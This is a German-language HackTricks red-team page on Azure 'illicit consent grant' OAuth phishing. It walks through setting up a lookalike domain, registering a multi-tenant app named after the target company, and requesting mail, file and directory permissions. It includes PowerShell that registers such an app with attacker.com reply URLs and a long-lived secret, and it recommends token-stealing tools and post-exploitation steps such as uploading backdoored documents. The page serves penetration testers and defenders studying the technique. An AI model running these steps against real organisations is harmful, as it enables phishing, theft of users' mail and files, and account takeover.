# Az - Illicit Consent Grant

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## OAuth App Phishing

**Azure-Anwendungen** fragen nach Berechtigungen, um auf die **Benutzerdaten** (Basisinformationen, aber auch Zugriff auf Dokumente, E-Mails senden...) zuzugreifen.\
Wenn **erlaubt**, kann ein normaler Benutzer nur f√ºr **"Low Impact"-Berechtigungen** Zustimmung erteilen. In **allen anderen** F√§llen ist **Admin-Zustimmung erforderlich**.\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` und eine benutzerdefinierte Rolle, die `Berechtigung zur Erteilung von Berechtigungen an Anwendungen` umfasst, k√∂nnen eine tenantweite Zustimmung erteilen.

Nur Berechtigungen, die **keine Admin-Zustimmung erfordern**, werden als **niedriges Risiko** klassifiziert. Dies sind Berechtigungen, die f√ºr **die grundlegende Anmeldung erforderlich sind, wie openid, Profil, E-Mail, User.Read und offline_access**. Wenn eine **Organisation** **Benutzerzustimmung f√ºr **alle Apps** erlaubt, kann ein Mitarbeiter einer App die Zustimmung erteilen, um **die oben genannten Informationen aus seinem Profil zu lesen**.

<figure><img src="../../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

Daher k√∂nnte ein Angreifer eine **b√∂sartige App** vorbereiten und mit einem **Phishing** den Benutzer dazu bringen, die App **zu akzeptieren und seine Daten zu stehlen**.

### 2 Arten von Angriffen mit unrechtm√§√üiger Zustimmung

* **Unauthenticated**: Erstellen Sie von einem externen Konto aus eine Anwendung mit den Berechtigungen `User.Read` und `User.ReadBasic.All`, phishen Sie einen Benutzer, und Sie k√∂nnen auf Verzeichnisinformationen zugreifen.
* Dies erfordert, dass der phished Benutzer in der Lage ist, OAuth-Apps aus externen Umgebungen zu akzeptieren!
* **Authenticated**: Nachdem Sie einen Principal mit ausreichenden Berechtigungen kompromittiert haben, erstellen Sie eine Anwendung im Konto und phishen Sie einen privilegierten Benutzer, der privilegierte OAuth-Berechtigungen akzeptieren kann.
* In diesem Fall k√∂nnen Sie bereits auf die Informationen des Verzeichnisses zugreifen, sodass die Berechtigung `User.ReadBasic.All` nicht mehr interessant ist.
* Sie sind wahrscheinlich an **Berechtigungen interessiert, die eine Zustimmung des Administrators erfordern**, da normale Benutzer OAuth-Apps keine Berechtigungen erteilen k√∂nnen, weshalb Sie **nur diese Benutzer phishen m√ºssen** (mehr dazu, welche Rollen/Berechtigungen dieses Privileg gew√§hren, sp√§ter).

### √úberpr√ºfen, ob Benutzer zustimmen d√ºrfen

Der folgende PowerShell-Befehl wird verwendet, um die Zustimmungskonfiguration f√ºr Benutzer in Azure Active Directory (Azure AD) hinsichtlich ihrer F√§higkeit zu √ºberpr√ºfen, Anwendungen zuzustimmen:
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
* **Benutzerzustimmung deaktivieren**: Diese Einstellung verbietet es Benutzern, Anwendungen Berechtigungen zu gew√§hren. Keine Benutzerzustimmung zu Anwendungen ist erlaubt.
* **Benutzer k√∂nnen Apps von verifizierten Herausgebern oder Ihrer Organisation zustimmen, jedoch nur f√ºr die von Ihnen ausgew√§hlten Berechtigungen**: Diese Einstellung erlaubt es allen Benutzern, nur Anwendungen zuzustimmen, die von einem verifizierten Herausgeber ver√∂ffentlicht wurden und Anwendungen, die in Ihrem eigenen Mandanten registriert sind. Sie f√ºgt eine Kontrollschicht hinzu, indem sie Zustimmung nur f√ºr bestimmte Berechtigungen erlaubt.
* **Benutzer k√∂nnen allen Apps zustimmen**: Diese Einstellung ist gro√üz√ºgiger und erlaubt es allen Benutzern, f√ºr Anwendungen allen Berechtigungen zuzustimmen, solange diese Berechtigungen keine administrative Zustimmung erfordern.
* **Benutzerdefinierte App-Zustimmungspolitik**: Diese Einstellung zeigt an, dass eine benutzerdefinierte Richtlinie vorhanden ist, die an spezifische organisatorische Anforderungen angepasst werden kann und m√∂glicherweise eine Kombination von Einschr√§nkungen basierend auf dem App-Herausgeber, den angeforderten Berechtigungen der App und anderen Faktoren umfasst.

## **Verstehen des Angriffs durch illegale Zustimmung**

Bei einem Angriff durch illegale Zustimmung tricksen Angreifer Endbenutzer, indem sie ihnen die Berechtigung erteilen, einer b√∂sartigen Anwendung, die bei Azure registriert ist, zuzustimmen. Dies geschieht, indem die Anwendung legitim erscheint, was die Opfer dazu f√ºhrt, unwissentlich auf eine "Akzeptieren"-Schaltfl√§che zu klicken. Infolgedessen gibt Azure AD ein Token an die Website des Angreifers aus, das ihnen den Zugriff auf und die Manipulation der Daten des Opfers erm√∂glicht, wie z. B. das Lesen oder Senden von E-Mails und den Zugriff auf Dateien, ohne ein organisatorisches Konto zu ben√∂tigen.

## **√úberblick √ºber den Angriffsablauf**

Der Angriff umfasst mehrere Schritte, die auf ein generisches Unternehmen abzielen. So k√∂nnte er ablaufen:

1. **Domainregistrierung und Anwendungs-Hosting**: Der Angreifer registriert eine Domain, die einer vertrauensw√ºrdigen Website √§hnelt, z. B. "safedomainlogin.com". Unter dieser Domain wird eine Subdomain erstellt (z. B. "companyname.safedomainlogin.com"), um eine Anwendung zu hosten, die darauf ausgelegt ist, Autorisierungscodes zu erfassen und Zugriffstoken anzufordern.
2. **Anwendungsregistrierung in Azure AD**: Der Angreifer registriert dann eine Multi-Tenant-Anwendung in seinem Azure AD-Mandanten und benennt sie nach dem Zielunternehmen, um legitim zu erscheinen. Er konfiguriert die Redirect-URL der Anwendung so, dass sie auf die Subdomain verweist, die die b√∂sartige Anwendung hostet.
3. **Einrichten von Berechtigungen**: Der Angreifer richtet die Anwendung mit verschiedenen API-Berechtigungen ein (z. B. `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`). Diese Berechtigungen erlauben es dem Angreifer, sensible Informationen im Namen des Benutzers zu extrahieren, sobald sie vom Benutzer gew√§hrt werden.
4. **Verbreitung b√∂sartiger Links**: Der Angreifer erstellt einen Link, der die Client-ID der b√∂sartigen Anwendung enth√§lt, und teilt ihn mit gezielten Benutzern, um sie zu t√§uschen und zur Zustimmung zu bewegen.

## **Nutzung von Tools f√ºr den Angriff**

Der Angriff kann mit Tools wie [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer) erleichtert werden.

### Vorbereitung vor dem Angriff:

Wenn der Angreifer einen gewissen Zugang zu einem Benutzer in der Opferorganisation hat, k√∂nnte er √ºberpr√ºfen, ob die Richtlinie der Organisation es dem Benutzer erlaubt, Apps zu akzeptieren:
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Password!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("generic@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Check if "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present, indicating permission to accept apps.
```
Um den Angriff auszuf√ºhren, m√ºsste der Angreifer eine **neue App in seinem Azure-Mandanten** (in App-Registrierungen) erstellen, die mit den Berechtigungen konfiguriert ist:

<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All` befindet sich in `Microsoft Graph` in `Delegierten Berechtigungen`. (Anwendungsberechtigungen ben√∂tigen immer eine zus√§tzliche Genehmigung).

* `User.ReadBasic.All` ist die Berechtigung, die es Ihnen erm√∂glicht, **Informationen √ºber alle Benutzer** in der Organisation zu **lesen**, wenn sie gew√§hrt wird.
* Denken Sie daran, dass nur `GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` und eine benutzerdefinierte Rolle, die `Berechtigung zur Gew√§hrung von Berechtigungen an Anwendungen` umfasst, eine mandantenweite Zustimmung erteilen k√∂nnen. Daher sollten Sie **einen Benutzer mit einer dieser Rollen phishing**, wenn Sie m√∂chten, dass er eine **App genehmigt, die eine Administratorgenehmigung erfordert**.

Sie k√∂nnten auch eine App √ºber die CLI mit folgendem Befehl erstellen:

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

√úberpr√ºfen Sie [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer), um zu erfahren, wie Sie es konfigurieren.

{% hint style="warning" %}
Beachten Sie, dass das erhaltene **Zugriffstoken** f√ºr den **Graph-Endpunkt** mit den Berechtigungen: `User.Read` und `User.ReadBasic.All` (den angeforderten Berechtigungen) sein wird. Sie werden keine anderen Aktionen durchf√ºhren k√∂nnen (aber diese sind ausreichend, um **Informationen √ºber alle Benutzer** in der Organisation herunterzuladen).
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

Sie k√∂nnten auch dieses Tool verwenden, um diesen Angriff durchzuf√ºhren.

## Post-Exploitation

Sobald Sie Zugriff auf den Benutzer haben, k√∂nnen Sie Dinge tun wie das Stehlen sensibler Dokumente und sogar das Hochladen von mit Backdoors versehenen Dokumentdateien.

## References

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
